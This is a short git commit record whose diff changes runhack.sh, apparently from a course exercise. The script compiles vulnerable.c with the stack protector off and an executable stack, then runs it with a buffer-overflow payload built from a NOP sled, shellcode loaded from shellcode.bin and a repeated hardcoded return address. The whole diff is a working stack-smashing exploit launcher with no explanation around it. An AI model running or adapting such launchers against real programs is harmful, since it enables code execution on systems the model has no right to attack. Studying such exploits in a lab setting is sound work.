9c7fb6de0b9753852a6bec515888f51dd0bb81d2
BinRoot <nick722@gmail.com>
2012-09-08 23:24:10 -0400

    fixed runhack

--- runhack.sh
+++ runhack.sh
@@ -1,3 +1,4 @@
 #!/bin/sh
-gcc -g -Wall -fno-stack-protector -z execstack -o a3.out;
+gcc -g -Wall -fno-stack-protector -z execstack -o a3.out vulnerable.c;
 ./a3.out `perl -e 'print "\x90"x3'``cat shellcode.bin``perl -e 'print "\x70\x11\xe6\xb7"x10'`;
+
